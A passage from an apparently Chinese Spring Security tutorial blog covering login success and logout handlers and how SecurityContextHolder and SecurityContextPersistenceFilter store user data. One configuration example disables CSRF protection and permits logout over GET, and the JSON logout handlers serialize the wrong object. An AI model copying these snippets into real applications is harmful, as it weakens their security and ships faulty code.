class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><br><br><br><br><br>这两个配置的都是AuthenticationSuccessHandler接口的实例并且该接口才是security用来处理登录成功的事项<br><br>其中AuthenticationSuccessHandler有两个方法一个是在处理特定的认证请求Authentication Filter中会用到;另一个用来进行处理登录成功的.<br><br>前两个参数很常见,而Authentication则用来传递登陆成功的用户信息<br><br>```java<br>public interface AuthenticationSuccessHandler &#123;<br>    default void on<span class="hljs-constructor">AuthenticationSuccess(HttpServletRequest <span class="hljs-params">request</span>, HttpServletResponse <span class="hljs-params">response</span>, FilterChain <span class="hljs-params">chain</span>, Authentication <span class="hljs-params">authentication</span>)</span> throws IOException, ServletException &#123;<br>        this.on<span class="hljs-constructor">AuthenticationSuccess(<span class="hljs-params">request</span>, <span class="hljs-params">response</span>, <span class="hljs-params">authentication</span>)</span>;<br>        chain.<span class="hljs-keyword">do</span><span class="hljs-constructor">Filter(<span class="hljs-params">request</span>, <span class="hljs-params">response</span>)</span>;<br>    &#125;<br><br>    void on<span class="hljs-constructor">AuthenticationSuccess(HttpServletRequest <span class="hljs-params">var1</span>, HttpServletResponse <span class="hljs-params">var2</span>, Authentication <span class="hljs-params">var3</span>)</span> throws IOException, ServletException;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li></ul><p>AuthenticationSuccessHandler有三个实现类</p><ul><li>SimpleUrlAuthenticationSuccessHandler:通过handle方法实现请求重定向</li><li>SavedRequestAwareAuthenticationSuccessHandler:在SimpleUrlAuthenticationSuccess Handler的基础上增加了请求缓存的功能，可以记录之前请求的地址，进而在登录成功后重定向到一开始访问的地址。</li><li>ForwardAuthenticationSuccessHandler:的实现则比较容易，就是一个服务端跳转。</li></ul><p>请求失败和请求成功差不多</p><h4 id="注销"><a href="#注销" class="headerlink" title="注销"></a>注销</h4><p>注销需要使用注销类所以要使用and()进行切换</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configure</span><span class="hljs-params">(HttpSecurity http)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>       <span class="hljs-comment">//.anyRequest().authenticated()代表所有请求认证后才能访问</span><br>       http.authorizeRequests()<br>            <br>               .and()<br>               <span class="hljs-comment">//开启表单配置</span><br>               .formLogin()<br>             <br>               .and()<br>               .logout()<br>               .logoutUrl(<span class="hljs-string">&quot;/logout&quot;</span>)<br>               <span class="hljs-comment">//是否清除认证</span><br>               .clearAuthentication(<span class="hljs-literal">true</span>)<br>               <span class="hljs-comment">//是否注销session</span><br>               .invalidateHttpSession(<span class="hljs-literal">true</span>)<br>               .logoutSuccessUrl(<span class="hljs-string">&quot;/mylogin&quot;</span>)<br>               <span class="hljs-comment">//表单配置完毕后进行返回</span><br>           .logoutRequestMatcher(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OrRequestMatcher</span>(<br>                       <span class="hljs-keyword">new</span> <span class="hljs-title class_">AntPathRequestMatcher</span>(<span class="hljs-string">&quot;/logout1&quot;</span>,<span class="hljs-string">&quot;GET&quot;</span>),<br>                       <span class="hljs-keyword">new</span> <span class="hljs-title class_">AntPathRequestMatcher</span>(<span class="hljs-string">&quot;/logout3&quot;</span>,<span class="hljs-string">&quot;POST&quot;</span>)<br>               ))<br>           <br>               .and()<br>               <span class="hljs-comment">//进行csrf配置</span><br>               .csrf()<br>               <span class="hljs-comment">//关闭csrf防御功能</span><br>               .disable();<br><br>   &#125;<br></code></pre></td></tr></table></figure><p>可以指定多个登出路径并且可以设置请求方法</p><p>如果使用的是前后分离则可以自定义.logoutSuccessHandler()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java">.logoutSuccessHandler(( req,resp,auth)-&gt;&#123;<br>             resp.setContentType(<span class="hljs-string">&quot;application/json;charset=utf-8&quot;</span>);<br>             Map&lt;String, Object&gt; respH = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>             respH.put(<span class="hljs-string">&quot;status&quot;</span>, <span class="hljs-number">200</span>);<br>             respH.put(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;登出成功!&quot;</span>);<br>             <span class="hljs-type">ObjectMapper</span> <span class="hljs-variable">om</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectMapper</span>();<br>             <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> om.writeValueAsString(resp);<br>             resp.getWriter().write(s);<br>         &#125;)<br>    <br>         .defaultLogoutSuccessHandlerFor(( req,resp,auth)-&gt;&#123;<br>             resp.setContentType(<span class="hljs-string">&quot;application/json;charset=utf-8&quot;</span>);<br>             Map&lt;String, Object&gt; respH = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>             respH.put(<span class="hljs-string">&quot;status&quot;</span>, <span class="hljs-number">200</span>);<br>             respH.put(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;登出成功!&quot;</span>);<br>             <span class="hljs-type">ObjectMapper</span> <span class="hljs-variable">om</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectMapper</span>();<br>             <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> om.writeValueAsString(resp);<br>             resp.getWriter().write(s);<br>         &#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">AntPathRequestMatcher</span>(<span class="hljs-string">&quot;/logout3&quot;</span>,<span class="hljs-string">&quot;POST&quot;</span>))<br></code></pre></td></tr></table></figure><p>有这两个方法进行自定义一个是设置登出地址的另一个是设置默认的</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><blockquote><p>用户的登录成功或失败,注销都差不多</p><p>都可以设置页面只不过登录的表单与注销的表单之间需要用and来切换</p><p>都可以自定义handle(使用lamda表达式更简单)</p></blockquote><h3 id="登录的用户数据获取"><a href="#登录的用户数据获取" class="headerlink" title="登录的用户数据获取"></a>登录的用户数据获取</h3><h4 id="第一种数据获取方式"><a href="#第一种数据获取方式" class="headerlink" title="第一种数据获取方式"></a>第一种数据获取方式</h4><p>使用了security后会对httpSession数据进行封装所以我们想要获取用户数据可以获取</p><ul><li>SecurityContextHolder</li><li>HttpSession</li></ul><p>但是这两个方法都要用到<a href="#%E8%AE%A4%E8%AF%81">认证类Authentication</a></p><p>该类有四个信息</p><blockquote><p>（1）principal：定义认证的用户。如果用户使用用户名／密码的方式登录，principal通常就是一个UserDetails对象。<br>（2）credentials：登录凭证，一般就是指密码。当用户登录成功之后，登录凭证会被自动擦除，以防止泄漏。<br>（3）authorities：用户被授予的权限信息。<br>（4）isAuthenticated()：是否认证</p></blockquote><p>Authentication有很多实现类</p><blockquote><p>UsernamePasswordAuthenticationToken</p><p>JaasAuthenticationToken</p><p>TestingAuthenticationToken</p><p>PreAuthenticatedAuthenticationToken</p><p>RememberMeAuthenticationToken</p><p>RunAsUserToken</p><p>等认证最常用的是UsernamePasswordAuthenticationToken和RememberMeAuthenticationToken</p></blockquote><p>emmmm上面这么多认证我们要用的时候要怎么取呢&lt;-_-&gt;:dog:看下面</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/hello2&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello2</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-comment">//获取当前用户信息</span><br>    <span class="hljs-type">Authentication</span> <span class="hljs-variable">authentication</span> <span class="hljs-operator">=</span> SecurityContextHolder.getContext().getAuthentication();<br>    <br>    <span class="hljs-comment">//获取角色</span><br>    Collection&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">GrantedAuthority</span>&gt; authorities =<br>            authentication.getAuthorities();<br>    System.out.println(<span class="hljs-string">&quot;authorities&quot;</span> + authorities);<br>    <br>    <span class="hljs-comment">//获取用户名</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> authentication.getName();<br>    System.out.println(name);<br>    <span class="hljs-keyword">return</span> name;<br>&#125;<br></code></pre></td></tr></table></figure><p>从上面可以看出通过SecurityContextHolder的静态方法就可以获取对象了,那为啥能获取呢?</p><h5 id="SecurityContextHolder的三种数据存储模式"><a href="#SecurityContextHolder的三种数据存储模式" class="headerlink" title="SecurityContextHolder的三种数据存储模式"></a>SecurityContextHolder的三种数据存储模式</h5><p><img src="/.com//Users\lll\AppData\Roaming\Typora\typora-user-images\image-20211002195222829.png" alt="image-20211002195222829"></p><p>根据图可以看出SecurityContextHolder中的内容</p><p>SecurityContextHolder的三种数据存储模式:</p><ul><li>MODE_THREADLOCAL:将SecurityContext存到ThreadLocal(那个线程存进去的那个线程才能取,所以一个请求无论经过多少filter和servlet都是一个线程处理的)这种方法如果用子线程取就会取不到,&#x3D;&#x3D;默认的&#x3D;&#x3D;</li><li>MODE_INHERITABLETHREADLOCAL：这种存储模式适用于多线程环境，如果希望在&#x3D;&#x3D;子线程中也能够获取到登录用户数据&#x3D;&#x3D;，那么可以使用这种存储模式。</li><li>MODE_GLOBAL：这种存储模式实际上是将数据保存在一个静态变量中，在Java Web开发中，这种模式很少使用到。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">SecurityContextHolderStrategy</span> &#123;<br>    <span class="hljs-comment">//清理SecurityContext对象。</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">clearContext</span><span class="hljs-params">()</span>;<br>    <span class="hljs-comment">//获取SecurityContext对象。</span><br>    SecurityContext <span class="hljs-title function_">getContext</span><span class="hljs-params">()</span>;<br>    <span class="hljs-comment">//设置SecurityContext对象。</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">setContext</span><span class="hljs-params">(SecurityContext context)</span>;<br>    <span class="hljs-comment">//创建一个空的SecurityContext对象。</span><br>    SecurityContext <span class="hljs-title function_">createEmptyContext</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>莫名奇妙给你个这个接口你一定莫名奇妙:dog:,其实这个接口有三个实现类这三个实现类就对应着上面三种模式</p><p><img src="/.com//Users\lll\AppData\Roaming\Typora\typora-user-images\image-20211002201040742.png" alt="image-20211002201040742"></p><p>源码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadLocalSecurityContextHolderStrategy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">SecurityContextHolderStrategy</span> &#123;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> ThreadLocal&lt;SecurityContext&gt; contextHolder = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadLocal</span>&lt;&gt;();<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">clearContext</span><span class="hljs-params">()</span> &#123;<br>contextHolder.remove();<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> SecurityContext <span class="hljs-title function_">getContext</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-type">SecurityContext</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> contextHolder.get();<br><span class="hljs-keyword">if</span> (ctx == <span class="hljs-literal">null</span>) &#123;<br>ctx = createEmptyContext();<br>contextHolder.set(ctx);<br>&#125;<br><span class="hljs-keyword">return</span> ctx;<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setContext</span><span class="hljs-params">(SecurityContext context)</span> &#123;<br>Assert.notNull(context, <span class="hljs-string">&quot;Only non-null SecurityContext instances are permitted&quot;</span>);<br>contextHolder.set(context);<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> SecurityContext <span class="hljs-title function_">createEmptyContext</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecurityContextImpl</span>();<br>&#125;<br><br>&#125;<br><br><span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InheritableThreadLocalSecurityContextHolderStrategy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">SecurityContextHolderStrategy</span> &#123;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> ThreadLocal&lt;SecurityContext&gt; contextHolder = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InheritableThreadLocal</span>&lt;&gt;();<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">clearContext</span><span class="hljs-params">()</span> &#123;<br>contextHolder.remove();<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> SecurityContext <span class="hljs-title function_">getContext</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-type">SecurityContext</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> contextHolder.get();<br><span class="hljs-keyword">if</span> (ctx == <span class="hljs-literal">null</span>) &#123;<br>ctx = createEmptyContext();<br>contextHolder.set(ctx);<br>&#125;<br><span class="hljs-keyword">return</span> ctx;<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setContext</span><span class="hljs-params">(SecurityContext context)</span> &#123;<br>Assert.notNull(context, <span class="hljs-string">&quot;Only non-null SecurityContext instances are permitted&quot;</span>);<br>contextHolder.set(context);<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> SecurityContext <span class="hljs-title function_">createEmptyContext</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecurityContextImpl</span>();<br>&#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>从ThreadLocalSecurityContextHolderStrategy该源码可知new ThreadLocal&lt;&gt;();</p><p>而InheritableThreadLocalSecurityContextHolderStrategy的源码可知 new InheritableThreadLocal&lt;&gt;();</p><p>其他基本都是一样的,InheritableThreadLocal对比ThreadLocal的最大特点是&#x3D;&#x3D;子线程创建的时候会将父线程的数据复制到子线程&#x3D;&#x3D;</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GlobalSecurityContextHolderStrategy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">SecurityContextHolderStrategy</span> &#123;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> SecurityContext contextHolder;<br><br></code></pre></td></tr></table></figure><p>对于GlobalSecurityContextHolderStrategy只是一个普通的static类</p><h5 id="SecurityContextHolder"><a href="#SecurityContextHolder" class="headerlink" title="SecurityContextHolder"></a>SecurityContextHolder</h5><p>聊完了三种模式我们再回头看看SecurityContextHolder这个可以获取用户数据的类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SecurityContextHolder</span> &#123;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">MODE_THREADLOCAL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;MODE_THREADLOCAL&quot;</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">MODE_INHERITABLETHREADLOCAL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;MODE_INHERITABLETHREADLOCAL&quot;</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">MODE_GLOBAL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;MODE_GLOBAL&quot;</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">SYSTEM_PROPERTY</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;spring.security.strategy&quot;</span>;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">strategyName</span> <span class="hljs-operator">=</span> System.getProperty(SYSTEM_PROPERTY);<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> SecurityContextHolderStrategy strategy;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">initializeCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initialize</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">if</span> (!StringUtils.hasText(strategyName)) &#123;<br><span class="hljs-comment">// Set default</span><br>strategyName = MODE_THREADLOCAL;<br>&#125;<br><span class="hljs-keyword">if</span> (strategyName.equals(MODE_THREADLOCAL)) &#123;<br>strategy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadLocalSecurityContextHolderStrategy</span>();<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strategyName.equals(MODE_INHERITABLETHREADLOCAL)) &#123;<br>strategy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InheritableThreadLocalSecurityContextHolderStrategy</span>();<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strategyName.equals(MODE_GLOBAL)) &#123;<br>strategy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">GlobalSecurityContextHolderStrategy</span>();<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">// Try to load a custom strategy</span><br><span class="hljs-keyword">try</span> &#123;<br>Class&lt;?&gt; clazz = Class.forName(strategyName);<br>Constructor&lt;?&gt; customStrategy = clazz.getConstructor();<br>strategy = (SecurityContextHolderStrategy) customStrategy.newInstance();<br>&#125;<br><span class="hljs-keyword">catch</span> (Exception ex) &#123;<br>ReflectionUtils.handleReflectionException(ex);<br>&#125;<br>&#125;<br>initializeCount++;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到上面三个常量代表的就是三个模式,第四个变量代表从配置文件如何获取配置</p><p>第五个才是确定要用的模式,可以看出默认是从配置文件中获取的</p><p>我们不同的请求是通过不同的线程处理的那为啥那为什么每一次请求都还能从SecurityContextHolder中获取到登录用户信息呢？</p><p>这就得看:SecurityContextPersistenceFilter的了</p><h5 id="SecurityContextPersistenceFilter"><a href="#SecurityContextPersistenceFilter" class="headerlink" title="SecurityContextPersistenceFilter"></a>SecurityContextPersistenceFilter</h5><p>这个实例主要做两个事情:</p><blockquote><p>（1）当一个请求到来时，从HttpSession中获取SecurityContext并存入SecurityContext Holder中，这样在同一个请求的后续处理过程中，开发者始终可以通过SecurityContextHolder获取到当前登录用户信息。<br>（2）当一个请求处理完毕时，从SecurityContextHolder中获取SecurityContext并存入HttpSession中（主要针对异步Servlet），方便下一个请求到来时，再从HttpSession中拿出来使用，同时擦除SecurityContextHolder中的登录用户信息。</p></blockquote><p>而上面这两个事情是由SecurityContextPersistence来做的</p><p>SecurityContextRepository:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">SecurityContextRepository</span> &#123;<br>    <span class="hljs-comment">//这个方法用来加载SecurityContext对象出来，对于没有登录的用户，这里会返回一个空的SecurityContext对象，注意空的SecurityContext对象是指SecurityContext中不存在Authentication对象，而不是该方法返回null。</span><br>    SecurityContext <span class="hljs-title function_">loadContext</span><span class="hljs-params">(HttpRequestResponseHolder var1)</span>;<br><br>    <span class="hljs-comment">//该方法用来保存一个SecurityContext对象。</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">saveContext</span><span class="hljs-params">(SecurityContext var1, HttpServletRequest var2, HttpServletResponse var3)</span>;<br><br>    <span class="hljs-comment">//该方法可以判断SecurityContext对象是否存在。</span><br>    <span class="hljs-type">boolean</span> <span class="hljs-title function_">containsContext</span><span class="hljs-params">(HttpServletRequest var1)</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>而该接口有三个实现类:</p><p><img src="/.com//Users\lll\AppData\Roaming\Typora\typora-user-images\image-20211003122105142.png" alt="image-20211003122105142"></p><p>NullSecurityContextRepository对数据的操作没有任何实现</p><p>TestSecurityContextRepository用于单元测试</p><p>HttpSeesionSecurityContextRepository默认的其中实现类数据的存储与读取</p><p>在HttpSeesionSecurityContextRepository中定义了SaveToSessionRequestWrapper与SaveToSessionResponseWrapper</p><h6 id="首先来看SaveToSessionResponseWrapper"><a href="#首先来看SaveToSessionResponseWrapper" class="headerlink" title="首先来看SaveToSessionResponseWrapper:"></a>首先来看SaveToSessionResponseWrapper:</h6><p><img src="/.com//Users\lll\AppData\Roaming\Typora\typora-user-images\image-20211003122321618.png" alt="image-20211003122321618"></p><p>从上图可知该类实现了HttpServletResponse并且还继承了三个类:</p><ul><li>HttpServletResponseWrapper:利用该类可以方便地操作参数和输出流等。</li><li>OnCommittedResponseWrapper:对上面的类进行了增强,最重要的增强在于可以获取HttpServletResponse的提交行为。不过onResponseCommitted方法只是一个抽象方法</li><li>SaveContextOnUpdateOrErrorResponseWrapper:该类实现了onResponseCommitted方法,但是定义了一个saveContext的抽象方法用来获取SecurityContext,只有是否存储成功用声明的contextSaved变量，表示SecuirtyContext是否已经存储成功。</li></ul><p>回到SaveToSessionResponseWrapper该类继承SaveContextOnUpdateOrErrorResponseWrapper并实现了saveContext这个抽象方法,除了这个还有该类定义的另两个方法,下面呈现主要的三个定义方法:</p><ul><li>saveContext:&#x3D;&#x3D;该方法主要是用来保存SecurityContext，&#x3D;&#x3D;如果authentication对象为null或者它是一个匿名对象，则不需要保存SecurityContext（参见SEC-776：<a href="https://github.com/spring-projects/spring-security/issues/1036%EF%BC%89%EF%BC%9B%E5%90%8C%E6%97%B6%EF%BC%8C%E5%A6%82%E6%9E%9C==httpSession%E4%B8%8D%E4%B8%BAnull%E5%B9%B6%E4%B8%94authBefore">https://github.com/spring-projects/spring-security/issues/1036）；同时，如果==httpSession不为null并且authBefore</a> Execution也不为null，就从httpSession中将保存的登录用户数据移除，这个主要是为了防止开发者在注销成功的回调中继续调用chain.doFilter方法，进而导致原始的登录信息无法清除的问题&#x3D;&#x3D;（参见SEC-1587：<a href="https://github.com/spring-projects/spring-security/issues/1826%EF%BC%89%EF%BC%9B%E5%A6%82%E6%9E%9ChttpSession%E4%B8%BAnull%EF%BC%8C%E5%88%99%E5%8E%BB%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AAHttpSession%E5%AF%B9%E8%B1%A1%EF%BC%9B%E6%9C%80%E5%90%8E%EF%BC%8C%E5%A6%82%E6%9E%9CSecurityContext%E5%8F%91%E7%94%9F%E4%BA%86%E5%8F%98%E5%8C%96%EF%BC%8C%E6%88%96%E8%80%85httpSession%E4%B8%AD%E6%B2%A1%E6%9C%89%E4%BF%9D%E5%AD%98SecurityContext%EF%BC%8C%E5%88%99%E8%B0%83%E7%94%A8httpSession%E4%B8%AD%E7%9A%84setAttribute%E6%96%B9%E6%B3%95%E5%B0%86SecurityContext%E4%BF%9D%E5%AD%98%E8%B5%B7%E6%9D%A5%E3%80%82">https://github.com/spring-projects/spring-security/issues/1826）；如果httpSession为null，则去创建一个HttpSession对象；最后，如果SecurityContext发生了变化，或者httpSession中没有保存SecurityContext，则调用httpSession中的setAttribute方法将SecurityContext保存起来。</a></li><li>contextChanged：该方法主要用来判断SecurityContext是否发生变化</li><li>createNewSessionIfAllowed：该方法用来创建一个HttpSession对象。</li></ul><p>SaveToSessionRequestWrapper类这个可比上面这个简单多了</p><h6 id="SaveToSessionRequestWrapper"><a href="#SaveToSessionRequestWrapper" class="headerlink" title="SaveToSessionRequestWrapper"></a>SaveToSessionRequestWrapper</h6><p>封装的SaveToSession 